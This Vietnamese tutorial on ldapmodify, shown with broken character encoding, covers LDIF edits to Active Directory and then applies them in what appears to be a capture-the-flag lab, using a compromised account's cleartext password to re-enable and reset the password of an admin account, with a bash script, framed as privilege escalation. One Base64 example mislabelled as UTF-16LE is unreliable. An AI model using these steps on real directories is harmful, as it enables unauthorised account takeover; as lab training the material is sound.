ğŸ§° 1. Giá»›i thiá»‡u ldapmodify lÃ  gÃ¬?

ldapmodify lÃ  cÃ´ng cá»¥ dÃ²ng lá»‡nh dÃ¹ng Ä‘á»ƒ:

    ThÃªm, sá»­a, hoáº·c xÃ³a dá»¯ liá»‡u trong há»‡ thá»‘ng LDAP (Lightweight Directory Access Protocol)

    LÃ  má»™t pháº§n cá»§a OpenLDAP tools, hoáº¡t Ä‘á»™ng Ä‘Æ°á»£c trÃªn cáº£ Linux vÃ  há»‡ thá»‘ng tÆ°Æ¡ng thÃ­ch LDAP (nhÆ° AD).

âš™ï¸ 2. CÃº phÃ¡p cÆ¡ báº£n

ldapmodify -x -H ldap://<host> -D "<bind_dn>" -w <password> -f <file.ldif>

Tham sá»‘	Ã nghÄ©a
-x	DÃ¹ng xÃ¡c thá»±c Ä‘Æ¡n giáº£n (simple bind)
-H	Äá»‹a chá»‰ LDAP server (ldap:// hoáº·c ldaps://)
-D	DN (Distinguished Name) cá»§a user dÃ¹ng Ä‘á»ƒ xÃ¡c thá»±c
-w	Máº­t kháº©u
-f	Tá»‡p LDIF chá»©a ná»™i dung thay Ä‘á»•i
ğŸ“„ 3. Cáº¥u trÃºc tá»‡p .ldif
âœ… Thay Ä‘á»•i thuá»™c tÃ­nh

dn: CN=someuser,CN=Users,DC=example,DC=com
changetype: modify
replace: displayName
displayName: New Display Name

â• ThÃªm thuá»™c tÃ­nh má»›i

dn: CN=someuser,CN=Users,DC=example,DC=com
changetype: modify
add: description
description: This is a new description

âŒ XÃ³a thuá»™c tÃ­nh

dn: CN=someuser,CN=Users,DC=example,DC=com
changetype: modify
delete: description

ğŸ” 4. Reset máº­t kháº©u (Active Directory)
âš ï¸ Máº­t kháº©u pháº£i á»Ÿ Ä‘á»‹nh dáº¡ng UTF-16LE vÃ  cÃ³ dáº¥u " bao quanh, sau Ä‘Ã³ Base64 encode náº¿u dÃ¹ng trong LDIF.

VÃ­ dá»¥ Ä‘áº·t máº­t kháº©u Pass123!:

dn: CN=someuser,CN=Users,DC=example,DC=com
changetype: modify
replace: unicodePwd
unicodePwd:: IlBhc3MxMjMhIg==

Giáº£i thÃ­ch:

    "Pass123!" â†’ mÃ£ hÃ³a UTF-16LE â†’ Base64 â†’ IlBhc3MxMjMhIg==

ğŸ” 5. KÃ­ch hoáº¡t hoáº·c vÃ´ hiá»‡u hÃ³a tÃ i khoáº£n

    KÃ­ch hoáº¡t: userAccountControl: 512

    VÃ´ hiá»‡u hÃ³a: userAccountControl: 514

dn: CN=someuser,CN=Users,DC=example,DC=com
changetype: modify
replace: userAccountControl
userAccountControl: 512

ğŸ§  6. CÃ¡c giÃ¡ trá»‹ userAccountControl phá»• biáº¿n
GiÃ¡ trá»‹	Ã nghÄ©a
512	Normal account (active)
514	Disabled account
544	Account + Password not required
66048	Account + Password never expires
ğŸ›¡ï¸ 7. Kiá»ƒm soÃ¡t nÃ¢ng cao (ACL, group, multi-attr)
âœ”ï¸ ThÃªm ngÆ°á»i dÃ¹ng vÃ o nhÃ³m

dn: CN=SomeGroup,CN=Users,DC=example,DC=com
changetype: modify
add: member
member: CN=someuser,CN=Users,DC=example,DC=com

âŒ XÃ³a ngÆ°á»i khá»i nhÃ³m

dn: CN=SomeGroup,CN=Users,DC=example,DC=com
changetype: modify
delete: member
member: CN=someuser,CN=Users,DC=example,DC=com

ğŸ§ª 8. Thá»­ nghiá»‡m trá»±c tiáº¿p

Giáº£ sá»­ báº¡n cÃ³ domain puppy.htb, user levi.james, báº¡n cÃ³ thá»ƒ:
ğŸ”„ KÃ­ch hoáº¡t tÃ i khoáº£n steph.cooper_adm:

File: enable.ldif

dn: CN=steph.cooper_adm,CN=Users,DC=puppy,DC=htb
changetype: modify
replace: userAccountControl
userAccountControl: 512

Lá»‡nh cháº¡y:

ldapmodify -x -H ldap://10.10.11.70 -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f enable.ldif

ğŸ” 9. Lá»—i phá»• biáº¿n & xá»­ lÃ½
Lá»—i	NguyÃªn nhÃ¢n
Insufficient access	TÃ i khoáº£n khÃ´ng Ä‘á»§ quyá»n (chÆ°a cÃ³ quyá»n modify object)
Constraint violation	Äáº·t sai Ä‘á»‹nh dáº¡ng thuá»™c tÃ­nh (VD: máº­t kháº©u sai Ä‘á»‹nh dáº¡ng Base64/UTF-16)
Invalid DN syntax	DN sai Ä‘á»‹nh dáº¡ng
No such object	KhÃ´ng tÃ¬m tháº¥y DN cáº§n chá»‰nh sá»­a
âœ… Tá»•ng káº¿t
Má»©c Ä‘á»™	Ká»¹ nÄƒng
CÆ¡ báº£n	Thay Ä‘á»•i thÃ´ng tin (tÃªn hiá»ƒn thá»‹, mÃ´ táº£), kÃ­ch hoáº¡t user
Trung bÃ¬nh	Reset máº­t kháº©u, thÃªm vÃ o group, xÃ³a thuá»™c tÃ­nh
NÃ¢ng cao	Ká»‹ch báº£n tá»± Ä‘á»™ng hÃ³a sá»­a LDAP, khai thÃ¡c quyá»n GenericWrite, WriteDACL, há»— trá»£ privilege escalation




=====================================================================================================================================================================================================




DÆ°á»›i Ä‘Ã¢y lÃ  hÆ°á»›ng dáº«n táº¡o file .ldif vÃ  script cháº¡y ldapmodify Ä‘á»ƒ:

    âœ… KÃ­ch hoáº¡t tÃ i khoáº£n steph.cooper_adm

    âœ… Äáº·t láº¡i máº­t kháº©u (vÃ­ dá»¥ NewPassw0rd!)

ğŸ“ 1. Táº¡o file enable_user.ldif â€“ KÃ­ch hoáº¡t tÃ i khoáº£n

Ná»™i dung:

dn: CN=steph.cooper_adm,CN=Users,DC=puppy,DC=htb
changetype: modify
replace: userAccountControl
userAccountControl: 512

ğŸ”‘ 2. Táº¡o file reset_password.ldif â€“ Äáº·t láº¡i máº­t kháº©u

Giáº£ sá»­ báº¡n muá»‘n Ä‘áº·t máº­t kháº©u: NewPassw0rd!
BÆ°á»›c 1: Táº¡o máº­t kháº©u Base64 (UTF-16LE vÃ  cÃ³ dáº¥u ngoáº·c kÃ©p " ")

Cháº¡y lá»‡nh sau Ä‘á»ƒ chuyá»ƒn chuá»—i "NewPassw0rd!" sang Base64 UTF-16LE:

echo -n '"NewPassw0rd!"' | iconv -f UTF-8 -t UTF-16LE | base64

âœ… VÃ­ dá»¥ output:

IgBOAGUAdwBQAGEAcwBzAHcAMAByAGQAIQAiAA==

BÆ°á»›c 2: Táº¡o file reset_password.ldif

dn: CN=steph.cooper_adm,CN=Users,DC=puppy,DC=htb
changetype: modify
replace: unicodePwd
unicodePwd:: IgBOAGUAdwBQAGEAcwBzAHcAMAByAGQAIQAiAA==

    LÆ°u Ã½: dáº¥u :: sau unicodePwd Ä‘á»ƒ bÃ¡o lÃ  giÃ¡ trá»‹ base64.

ğŸ§ª 3. Script Bash cháº¡y cáº£ 2 file

File: apply_changes.sh

#!/bin/bash

LDAP_SERVER="ldap://10.10.11.70"
BIND_DN="levi.james@puppy.htb"
PASSWORD="KingofAkron2025!"

echo "[*] KÃ­ch hoáº¡t tÃ i khoáº£n steph.cooper_adm..."
ldapmodify -x -H $LDAP_SERVER -D "$BIND_DN" -w "$PASSWORD" -f enable_user.ldif

echo "[*] Äáº·t láº¡i máº­t kháº©u tÃ i khoáº£n steph.cooper_adm..."
ldapmodify -x -H $LDAP_SERVER -D "$BIND_DN" -w "$PASSWORD" -f reset_password.ldif

ğŸ”“ Cáº¥p quyá»n vÃ  cháº¡y

chmod +x apply_changes.sh
./apply_changes.sh

ğŸ›¡ï¸ Gá»£i Ã½ báº£o máº­t

KhÃ´ng nÃªn Ä‘á»ƒ máº­t kháº©u rÃµ rÃ ng (KingofAkron2025!) trong script náº¿u dÃ¹ng tháº­t â€“ báº¡n nÃªn dÃ¹ng biáº¿n mÃ´i trÆ°á»ng hoáº·c file riÃªng chá»©a máº­t kháº©u.
